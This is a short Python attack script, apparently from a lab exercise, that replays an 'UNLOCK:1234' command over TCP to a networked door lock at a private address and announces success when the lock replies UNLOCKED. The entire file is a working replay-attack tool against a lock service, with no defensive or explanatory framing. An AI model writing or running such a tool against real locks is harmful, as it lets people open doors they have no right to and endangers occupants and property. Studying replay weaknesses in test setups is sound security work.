#!/usr/bin/env python3
# ~/lock-attack/lock_replay.py

import socket, sys, time

def replay(host, port, payload, repeat=1):
    for i in range(repeat):
        if repeat > 1:
            print(f"\n[*] Replay attempt {i+1}/{repeat}")
        try:
            with socket.create_connection((host, port), timeout=5) as s:
                print(f"[>] Sending replayed payload to {host}:{port}: {payload!r}")
                s.sendall((payload + "\n").encode())
                resp = s.recv(256).decode().strip()
                print(f"[<] Lock response: {resp}")
                if "UNLOCKED" in resp:
                    print("[!] SUCCESS — door unlocked via replay attack")
        except Exception as e:
            print(f"[!] Error: {e}")
        if repeat > 1 and i < repeat - 1:
            time.sleep(1)

if __name__ == "__main__":
    host    = sys.argv[1] if len(sys.argv) > 1 else "192.168.50.20"
    payload = sys.argv[2] if len(sys.argv) > 2 else "UNLOCK:1234"
    port    = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
    replay(host, port, payload)
